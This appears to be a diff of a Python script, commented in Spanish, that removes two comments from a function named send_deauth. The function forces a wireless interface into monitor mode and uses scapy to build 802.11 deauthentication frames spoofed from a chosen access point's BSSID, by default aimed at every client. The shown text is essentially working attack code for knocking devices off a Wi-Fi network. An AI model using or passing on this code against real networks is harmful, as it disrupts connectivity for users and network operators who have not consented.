@@ -9,12 +9,10 @@ def check_monitor(interface):
 def send_deauth(interface, bssid, client='ff:ff:ff:ff:ff:ff', count=20, interval=0.1):
     if not check_monitor(interface):
         print(f"[!] La interfaz {interface} no está en modo monitor. Intentando forzar...")
-        # Si no está en modo monitor, intentamos ponerla (por si acaso)
         subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
         subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], capture_output=True)
         subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
 
-    # Construimos la trama de deauth
     pkt = (RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))
 
     print(f"[*] Enviando {count} tramas deauth a {client} desde {bssid}...")
